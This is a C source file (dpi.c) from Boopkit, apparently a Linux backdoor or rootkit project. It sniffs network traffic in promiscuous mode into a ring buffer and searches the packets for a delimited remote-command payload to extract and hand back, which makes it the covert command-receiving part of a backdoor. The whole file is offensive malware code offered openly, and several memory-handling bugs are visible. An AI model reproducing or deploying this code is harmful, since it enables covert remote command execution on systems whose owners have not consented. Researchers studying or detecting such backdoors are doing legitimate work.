// Copyright © 2022 Kris Nóva <kris@nivenly.com>
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// ███╗   ██╗ ██████╗ ██╗   ██╗ █████╗
// ████╗  ██║██╔═████╗██║   ██║██╔══██╗
// ██╔██╗ ██║██║██╔██║██║   ██║███████║
// ██║╚██╗██║████╔╝██║╚██╗ ██╔╝██╔══██║
// ██║ ╚████║╚██████╔╝ ╚████╔╝ ██║  ██║
// ╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝
//
// [dpi.c]

#define _GNU_SOURCE
#include <net/ethernet.h>
#include <netinet/ip.h>
#include <pcap.h>
#include <pthread.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
// clang-format off
#include "dpi.h"
#include "common.h"
// clang-format on

//--- [ Header ] ---

//#define XCAP_BUFFER_SIZE 16384
#define XCAP_BUFFER_SIZE 64

typedef struct xcap_ip_packet {
  int captured;
  struct ip *iph;
  unsigned char *packet;
  struct pcap_pkthdr *header;
} xcap_ip_packet;

// xcap_ring_buffer is the main thread safe packet ring buffer
xcap_ip_packet *xcap_ring_buffer[XCAP_BUFFER_SIZE];
int xcap_pos = 0;      // The position of the ring buffer to write
int xcap_collect = 1;  // While (xcap_collect) { /* events */ }
pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;

//--- [ Header ] ---

int rce_filter(char *raw, char *rce) {
  char *target = NULL;
  char *start, *end;
  start = strstr(raw, BOOPKIT_RCE_DELIMITER);
  if (start) {
    start += strlen(BOOPKIT_RCE_DELIMITER);
    end = strstr(start, BOOPKIT_RCE_DELIMITER);
    if (end) {
      target = (char *)malloc(end - start + 1);
      memcpy(target, start, end - start);
      target[end - start] = '\0';
    }
  }
  if (target) {
    strncpy(rce, target, strlen(target));
    free(target);
    return 1;
  }
  return 0;
}

void xpack_dump(xcap_ip_packet *xpack) {
  boopprintf("  -> Dumping Raw Xpack:\n");
  unsigned char *packet = xpack->packet;
  for (int j = 0; j < xpack->header->caplen; j++) {
    boopprintf("%c", packet[j]);
  }
  boopprintf("\n");
}

void snapshot_dump(xcap_ip_packet *snap[XCAP_BUFFER_SIZE]) {
  boopprintf("  -> Dumping Raw Snapshot:\n");
  for (int i = 0; i < XCAP_BUFFER_SIZE; i++) {
    struct xcap_ip_packet *xpack;
    xpack = snap[i];
    if (!xpack->captured || xpack->header->caplen < 1) {
      continue;
    }
    xpack_dump(xpack);  // printf
  }
}

void snapshot_free(xcap_ip_packet *snap[XCAP_BUFFER_SIZE]) {
  boopprintf("  -> Free Snapshot\n");
  for (int i = 0; i < XCAP_BUFFER_SIZE; i++) {
    struct xcap_ip_packet *xpack;
    xpack = snap[i];
    xpack->captured = 0;
    free(xpack->packet);
    free(xpack->iph);
    free(xpack->header);
    free(xpack);
  }
}

void *xcap(void *v_dev_name) {
  char *dev_name = (char *)v_dev_name;
  boopprintf("  -> Starting xCap Interface : %s\n", dev_name);

  // Initialize ring buffer
  for (int ii = 0; ii < XCAP_BUFFER_SIZE; ii++) {
    struct xcap_ip_packet *xpack = malloc(sizeof(struct xcap_ip_packet));
    xpack->packet = malloc(1);  // Init to 1 byte to begin!
    xpack->iph = malloc(sizeof(struct ip));
    xpack->header = malloc(sizeof(struct pcap_pkthdr));
    xpack->captured = 0;
    xcap_ring_buffer[ii] = xpack;
  }

  // TCP Dump filter
  char filter_exp[] = "";
  pcap_t *handle;
  char errbuf[PCAP_ERRBUF_SIZE];
  struct bpf_program fp;
  bpf_u_int32 mask;
  bpf_u_int32 net;
  struct pcap_pkthdr header;
  if (pcap_lookupnet(dev_name, &net, &mask, errbuf) == -1) {
    boopprintf("Couldn't get netmask for device %s: %s\n", dev_name, errbuf);
    net = 0;
    mask = 0;
  }

  /* Open the session in promiscuous mode */
  handle = pcap_open_live(dev_name, BUFSIZ, 1, 1000, errbuf);
  if (handle == NULL) {
    boopprintf("Couldn't open device %s: %s\n", dev_name, errbuf);
    return NULL;
  }

  // TODO Manage filters!
  // --- [ Filter ] ---
  if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
    boopprintf("Couldn't parse filter %s: %s\n", filter_exp,
               pcap_geterr(handle));
    return NULL;
  }
  if (pcap_setfilter(handle, &fp) == -1) {
    boopprintf("Couldn't install filter %s: %s\n", filter_exp,
               pcap_geterr(handle));
    return NULL;
  }
  // --- [ Filter ] ---

  boopprintf("  -> xCap RingBuffer Started : %s\n", dev_name);

  /* Search for RCE */
  struct ether_header *ep;

  unsigned short ether_type;
  int cycle = 0;
  const u_char *packet;
  struct ip *iph;
  while (xcap_collect) {
    packet = pcap_next(handle, &header);
    ep = (struct ether_header *)packet;
    ether_type = ntohs(ep->ether_type);
    if (ether_type != ETHERTYPE_IP) {
      continue;
    }
    packet += sizeof(struct ether_header);
    iph = (struct ip *)packet;

    // boopprintf("IP Ver = %d\n", iph->ip_v);
    // boopprintf("IP Header len = %d\n", iph->ip_hl<<2);
    // boopprintf("[PRE] IP Source Address = %s\n", inet_ntoa(iph->ip_src));
    // boopprintf("[PRE] IP Dest Address = %s\n", inet_ntoa(iph->ip_dst));
    // boopprintf("IP Packet size = %d\n", len-16);

    if (xcap_pos == XCAP_BUFFER_SIZE) {
      // Start the ring buffer back at 0, and we have now
      // completed a "cycle"
      xcap_pos = 0;
      cycle = 1;
    }
    if (cycle) {
      // If we are cycling, free up the previous position in
      // the ring buffer.
      pthread_mutex_lock(&lock);
      free(xcap_ring_buffer[xcap_pos]->packet);
      free(xcap_ring_buffer[xcap_pos]->iph);
      free(xcap_ring_buffer[xcap_pos]->header);
      free(xcap_ring_buffer[xcap_pos]);
      pthread_mutex_unlock(&lock);
    }

    // Xcap Packet Ring Buffer
    struct xcap_ip_packet *xpack = malloc(sizeof(xcap_ip_packet));
    xpack->packet = malloc(header.len);
    xpack->iph = malloc(sizeof(struct ip));
    xpack->header = malloc(sizeof(struct pcap_pkthdr));
    xpack->captured = 1;
    memcpy(xpack->packet, packet, header.len);
    memcpy(xpack->iph, iph, sizeof(struct ip));
    memcpy(xpack->header, &header, sizeof(struct pcap_pkthdr));
    pthread_mutex_lock(&lock);
    xcap_ring_buffer[xcap_pos] = xpack;
    pthread_mutex_unlock(&lock);
    xcap_pos++;
  }
  // Initialize ring buffer
  for (int ii = 0; ii <= XCAP_BUFFER_SIZE; ii++) {
    free(xcap_ring_buffer[ii]);
  }
  pcap_close(handle);
  return NULL;
}

// snapshot is thread safe
int snapshot(xcap_ip_packet *snap[XCAP_BUFFER_SIZE]) {
  boopprintf("  -> Taking snapshot of network traffic.\n");
  pthread_mutex_lock(&lock);
  for (int i = 0; i < XCAP_BUFFER_SIZE; i++) {
    struct xcap_ip_packet *from = xcap_ring_buffer[i];
    struct xcap_ip_packet *to = malloc(sizeof(xcap_ip_packet));

    // packet
    to->packet = malloc(from->header->caplen);
    memcpy(to->packet, from->packet, from->header->caplen);

    // iph
    struct in_addr src_in = from->iph->ip_src;
    // boopprintf("[SNAP] IP Source Address = %s\n", inet_ntoa(src_in));
    // boopprintf("[SNAP] IP Dest Address = %s\n", inet_ntoa((struct in_addr)
    // from->iph->ip_dst));
    to->iph = malloc(sizeof(struct ip));
    memcpy(to->iph, from->iph, sizeof(struct ip));

    // header
    to->header = malloc(sizeof(struct pcap_pkthdr));
    memcpy(to->header, from->header, sizeof(struct pcap_pkthdr));

    snap[i] = to;
  }
  pthread_mutex_unlock(&lock);

  boopprintf("  -> Snapshot complete!\n");
  return 0;
}

// xcaprce is the main "interface" for pulling an RCE
// out of the kernel.
//
// Different implementations may exist, for the first example
// we are just using pcap.h
int xcaprce(char search[INET_ADDRSTRLEN], char *rce) {
  sleep(1);  // Wait for the kernel to catch up
  boopprintf("  -> Search xCap Ring Buffer: %s\n", search);
  xcap_ip_packet *snap[XCAP_BUFFER_SIZE];
  snapshot(snap);  // Thread safe snapshot of the ring buffer!
  for (int i = 0; i < XCAP_BUFFER_SIZE; i++) {
    struct xcap_ip_packet *xpack;
    xpack = snap[i];
    if (!xpack->captured) {
      continue;  // Ignore non captured packets in the buffer
    }
    unsigned char *packet = xpack->packet;
    // DPI for our RCE
    char *rce_sub;
    rce_sub = memmem(packet, xpack->header->caplen, BOOPKIT_RCE_DELIMITER,
                     strlen(BOOPKIT_RCE_DELIMITER));
    if (rce_sub != NULL) {
      boopprintf("  -> Found RCE xCap!\n");
      int found;
      found = rce_filter(rce_sub, rce);
      if (found) {
        // xpack_dump(xpack);
        snapshot_free(snap);
        return 0;  // Money, Success, Fame, Glamour
      } else {
        boopprintf("  -> [FILTER FAILURE] No RCE in xCap!\n");
        snapshot_dump(snap);
        snapshot_free(snap);
        return 1;
      }
    }
  }
  boopprintf("  -> No RCE in xCap!\n");
  snapshot_dump(snap);
  snapshot_free(snap);
  return 1;
  // return 0; // When we found our RCE!
}
